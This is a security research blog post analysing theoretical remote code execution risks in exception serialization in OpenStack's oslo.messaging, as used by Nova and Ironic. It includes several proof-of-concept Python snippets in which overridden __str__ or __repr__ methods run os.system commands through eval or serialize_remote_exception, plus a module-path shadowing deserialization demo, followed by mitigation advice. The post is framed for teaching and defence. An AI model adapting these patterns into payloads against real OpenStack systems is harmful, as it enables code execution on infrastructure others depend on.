---
title: "Exception Serialization Patterns in OpenStack Nova: Theoretical RCE Risks and Lessons Learned"
date: 2025-06-10
draft: false
tags: ["OpenStack", "Nova", "RCE", "Vulnerability Analysis", "oslo.messaging", "Exception Serialization"]
categories: ["Security Research", "Vulnerability Analysis"]
summary: "Analysis of potential Remote Code Execution vulnerability in OpenStack Nova's exception serialization mechanism, including multiple PoC scenarios and defense recommendations."
image: "/images/post/ironic-conceptual-architecture.webp"
---


 **Author**: Hyeongkwan Lee  
 **Email**: windshock@gmail.com  
 **GitHub**: [https://github.com/windshock](https://github.com/windshock)  
 **LinkedIn**: [https://www.linkedin.com/in/windshock/](https://www.linkedin.com/in/windshock/)  
 **Blog**: [https://windshock.github.io](https://windshock.github.io/)

---

**XML-RPC Security Series:**

- [Series 1 - XML-RPC Security Vulnerabilities Analysis and Mitigation Strategies](https://windshock.github.io/en/post/2025-03-28-xml-rpc-security-vulnerabilities-analysis-and-mitigation-strategies/)
- [Series 2 - CVE-2019-17570: Apache XML-RPC Exploit](https://windshock.github.io/en/post/2025-04-24-cve-2019-17570-apache-xmlrpc/)
- [Series 3 - Exception Serialization Patterns in OpenStack Nova: Theoretical RCE Risks and Lessons Learned](https://windshock.github.io/en/post/2025-05-30-rce-via-exception-serialization-in-openstack-nova/)

---

## **Overview**

This report analyzes theoretical Remote Code Execution (RCE) risks related to exception serialization and deserialization in OpenStack Nova's use of the `oslo.messaging` library. The goal is not to claim that practical RCE is easily achievable, but to help security engineers and developers recognize anti-patterns and learn from them. Multiple real-world safeguards (such as module whitelisting, message broker isolation, and secure logging practices) make actual exploitation highly unlikely in production OpenStack environments. The following PoC scenarios are intended for educational purposes, to illustrate how insecure exception handling patterns could become risky if other defenses are misconfigured or absent.

---

## **Key Findings**

> **Note:** These PoCs are for educational demonstration of risky exception handling patterns. In real OpenStack deployments, multiple safeguards make actual exploitation highly unlikely.

### **✅ PoC 1 – `__str__` Override with `eval(str(e))` (Theoretical Example)**

This proof-of-concept demonstrates, in a controlled example, that when an exception class overrides its `__str__()` method to return a malicious string, any call to `eval(str(e))` could theoretically result in Remote Code Execution. In practice, such a pattern should never appear in production code, and OpenStack's architecture includes multiple layers of defense.

```python
class Evil(Exception):
    def __str__(self):
        return "__import__('os').system('touch /tmp/from_str_eval')"

eval(str(Evil()))  # Triggers RCE
```
### **✅ PoC 2 – `__str__` Returns JSON Payload + `eval` (Theoretical Example)**

This variant shows, for educational purposes, how a `__str__()` method returning a JSON-encoded payload could, if mishandled, lead to code execution if the parsed content is used in an `eval()` call. Again, this is not a pattern seen in well-designed production systems, but highlights why input validation and secure exception handling are important.

```python
class Evil(Exception):
    def __str__(self):
        return '{"payload": "__import__(\'os\').system(\'touch /tmp/json_rce\')"}'

data = json.loads(str(Evil()))
eval(data["payload"])  # Triggers RCE
```

### **✅ PoC 3 – `eval(repr(e))` (Theoretical Example)**

This PoC demonstrates, as a theoretical risk, that `repr()` can also be overridden to return arbitrary content. If any part of the system executes `eval(repr(obj))` without ensuring that `obj` is a safe type, code execution could occur. This underscores that both `__str__` and `__repr__` must be considered attack surfaces in code reviews.

```python
class Evil:
    def __repr__(self):
        return "__import__('os').system('touch /tmp/hacked')"

eval(repr(Evil()))  # RCE
```
### **✅ PoC 4 – Trigger via `serialize_remote_exception()` (Theoretical Example)**

Here, the PoC illustrates that if OpenStack's `serialize_remote_exception()` function were to call `str(e)` on a malicious exception object, code execution could theoretically occur. In practice, OpenStack's design and deployment mitigations make this scenario extremely unlikely.

```python
import sys
import os
from oslo_messaging._drivers import common as exceptions

class EvilError(Exception):
    def __str__(self):
        os.system("touch /tmp/hacked")
        return "rce via serialize"

try:
    raise EvilError("boom")
except Exception:
    exc_info = sys.exc_info()
    serialized = exceptions.serialize_remote_exception(exc_info)

print("File created:", os.path.exists("/tmp/hacked"))

→ Malicious __str__() is executed within the serializer.
```

### **✅ PoC 5 – Race Condition with Threads (Theoretical Example)**

This experiment simulates a theoretical race condition scenario in which multiple threads concurrently deserialize and serialize exception objects. The test proves that when two threads (a producer and a consumer) access shared exceptions via a queue, the serializer thread may trigger `str(ex)` on a malicious object before it has been fully sanitized. As discussed below, this is not a realistic risk in actual OpenStack deployments.

> **Note:** In actual OpenStack oslo.messaging and Nova implementations, global variables or direct sharing of exception objects across threads or processes does not occur. Exception objects are always serialized and deserialized across process or network boundaries, meaning each thread or process works with its own instance. Therefore, the race condition demonstrated in this PoC does not represent a realistic risk in real-world OpenStack environments. This PoC should be considered a theoretical demonstration of Python concurrency issues, not a practical exploit vector for OpenStack.

This demonstrates the danger of using shared resources and exception objects across asynchronous or threaded boundaries without protective synchronization or trust boundaries. Even in environments with the GIL, race windows can expose critical bugs.

#### **Limitations of This PoC**

* This PoC assumes shared mutable global state (`hit_count`), which is not typically used in production code.

* Python's Global Interpreter Lock (GIL) limits true concurrency, so race conditions in CPython are often timing-dependent and may be less predictable.

* The `Boom` object is explicitly crafted and passed across a shared queue without serialization boundaries; in real deployments, such objects would typically be serialized/deserialized across process or network boundaries, limiting direct reference reuse.

* Nevertheless, this PoC illustrates the class of timing-sensitive bugs that arise from deserialization and stringification of attacker-influenced objects in multi-threaded environments.

```python

import threading
import os
import time
import random
from queue import Queue
import queue  # for queue.Full exception

# Shared resources
hit_count = 0
ex_queue = Queue(maxsize=5)

class Boom(Exception):
    def __str__(self):
        global hit_count
        local_count = hit_count
        print(f"Thread {threading.current_thread().name} reading hit_count={local_count}")
        time.sleep(random.uniform(0.001, 0.003))  # 1ms ~ 3ms delay
        hit_count = local_count + 1
        print(f"Thread {threading.current_thread().name} set hit_count={hit_count}")
        os.system(f"touch /tmp/hacked_race_{hit_count}_thread_{threading.current_thread().name}")
        return f"boom_{hit_count}"

def deserializer():
    global hit_count
    while hit_count < 5:
        ex = Boom()
        print(f"Thread {threading.current_thread().name} created Boom")
        try:
            ex_queue.put(ex, timeout=0.1)
            time.sleep(random.uniform(0.001, 0.003))
        except queue.Full:
            time.sleep(random.uniform(0.001, 0.003))
            continue

def serializer():
    global hit_count
    while hit_count < 5:
        try:
            ex = ex_queue.get(timeout=0.3)
            print(f"Thread {threading.current_thread().name} got Boom, calling str")
            str(ex)  # Triggers Boom.__str__
            time.sleep(random.uniform(0.001, 0.003))
        except Queue.Empty:
            time.sleep(random.uniform(0.001, 0.003))
            continue

# Minimal thread setup
threads = [
    threading.Thread(target=deserializer, name=f"Deserializer-{i}") for i in range(2)
] + [
    threading.Thread(target=serializer, name=f"Serializer-{i}") for i in range(3)
]

for t in threads:
    t.start()
for t in threads:
    t.join(timeout=5)

print("Final hit_count:", hit_count)
print("Generated files:", sorted([f for f in os.listdir("/tmp") if f.startswith("hacked_race_")]))

```
---

## **OpenStack-specific Vulnerability Context**

The vulnerable functions `serialize_remote_exception()` and `deserialize_remote_exception()` are part of the `oslo.messaging` library, not Nova itself. Nova uses them as part of its RPC communication and error-handling infrastructure. These functions are located in `oslo_messaging/_drivers/common.py` and are called by various RPC transport mechanisms. Because oslo.messaging is a shared library across OpenStack services, this vulnerability has implications beyond Nova if other components reuse the same serialization logic.

### **serialize\_remote\_exception()**

This function serializes Python exceptions into a dictionary format for RPC transport. One critical line calls `str(failure)`, which is the same as `str(ex)`. If the exception object has an overridden `__str__()` method with side effects, this call can trigger arbitrary code execution. This makes the serialization process itself a potential RCE entry point, especially if exceptions are passed from untrusted sources or deserialized objects.

```python
data = {
   'class': cls_name,
   'module': mod_name,
   'message': str(failure),
   'tb': tb,
   'args': failure.args,
   'kwargs': kwargs
}
```

### **deserialize\_remote\_exception()**

This function dynamically imports and reconstructs exception classes from RPC responses. It uses the `module` and `class` fields in the serialized data to locate the exception class and instantiate it with the provided arguments. While Nova restricts deserialization via `allowed_remote_exmods`, any misconfiguration or unsafe exception content (such as crafted `__str__()` methods) can still result in dangerous behavior if the reconstructed exception is logged or stringified later.

```python
_EXCEPTIONS_MODULE = 'builtins'
_EXCEPTIONS_MODULES = ['exceptions', 'builtins']

if module in _EXCEPTIONS_MODULES:
   module = _EXCEPTIONS_MODULE

if module != _EXCEPTIONS_MODULE and module not in allowed_remote_exmods:
    return RemoteError(name, message, traceback)

mod = importutils.import_module(module)
klass = getattr(mod, name)
if not issubclass(klass, Exception):
    raise TypeError(...)
exc = klass(*args, **kwargs)
```

These functions expose str(e) as a potential RCE entry point if attacker-controlled classes are deserialized and logged.

---

### **OpenStack Products and Custom Exception Namespaces**

In some OpenStack products such as Ironic, exceptions are not limited to the Python builtins but are often defined in product-specific namespaces. For example, Ironic and related components use their own exception modules, and the list of allowed exception namespaces may include values like:

```python
allowed_exception_namespaces = [
    'ironic_lib.exception.',
    'ironic.common.exception.',
    'ironic_inspector.utils.'
]
```

See: [Ironic JSON RPC Reference](https://docs.openstack.org/ironic-lib/wallaby/reference/api/ironic_lib.json_rpc.html)

Due to Python's import path resolution, if a local file exists that matches the expected module path (e.g., `ironic/common/exception.py`), that local file will be imported first. This means that if an attacker is able to upload or place a malicious exception file at the expected path, it could be loaded during deserialization. For example:

```python
from ironic.common import exception
from oslo_messaging._drivers import common as exceptions
e = '{"class": "MyException", "module": "ironic.common.exception", "message": "\uc5d0\ub7ec: test", "tb": ["MyException: \uc5d0\ub7ec: test\n"], "args": ["test"], "kwargs": {}}'
sys.modules['ironic.common.exception']
# <module 'ironic.common.exception' from './ironic/common/exception.py'>
exceptions.deserialize_remote_exception(e,['ironic.common.exception'])
# execute init
# MyException_Remote('test')
```

Contents of ironic/common/exception.py:
```python
class MyException(Exception):
    def __init__(self, msg):
        print("execute init")
        self.msg = msg
    def __str__(self):
        print("execute str")
        return f"error: {self.msg}"

MyException("test")
```

This demonstrates that deserialization can instantiate attacker-controlled exception classes if the import path can be influenced or a malicious file is present locally.

---

## **Challenges to Exploitation**

* Requires access to the message broker (e.g., RabbitMQ)

* Tainted exception object must survive to a point where it is formatted

* Only classes in `allowed_remote_exmods` can be instantiated

* Many logging systems use `exc_info=True`, avoiding `str(e)`

However, misconfigured systems, improper logging, or overbroad whitelisting may create a realistic attack path.

---

## **Recommendations**

* Strictly define and audit `allowed_remote_exmods`

* Never `str()` or `repr()` exception objects directly in logs

* Prefer logging frameworks with `exc_info=True`

* Sanitize all exception message content

* Use `RemoteError` as a fallback to avoid importing user-defined classes

* Review thread concurrency behaviors in RPC exception handling paths

---

## **Related References and Resources**

* **OpenStack Trove RPC Security Specification**  
   [https://specs.openstack.org/openstack/trove-specs/specs/ocata/secure-oslo-messaging-messages.html](https://specs.openstack.org/openstack/trove-specs/specs/ocata/secure-oslo-messaging-messages.html)

* **ZeroMQ Removal of Pickle Support (Launchpad bug)**  
   [https://bugs.launchpad.net/bugs/1582207](https://bugs.launchpad.net/bugs/1582207)

* **OpenStack Security Guidelines: Avoid Dangerous Input Parsing Libraries**  
   [https://security.openstack.org/guidelines/dg\_avoid-dangerous-input-parsing-libraries.html](https://security.openstack.org/guidelines/dg_avoid-dangerous-input-parsing-libraries.html)

---

## **Conclusion**

This analysis demonstrates that certain exception serialization and deserialization patterns could, in theory, result in code execution if all other safeguards fail. However, the exploitability is limited by real-world constraints and OpenStack's layered defenses. The primary goal of this report is to help readers recognize and avoid insecure exception handling patterns, not to suggest that OpenStack is practically vulnerable to RCE via these mechanisms. Learning from these anti-patterns will help improve the security posture of distributed Python applications.

Future work should explore automated tooling to detect vulnerable flows and validate exploit feasibility in controlled OpenStack environments.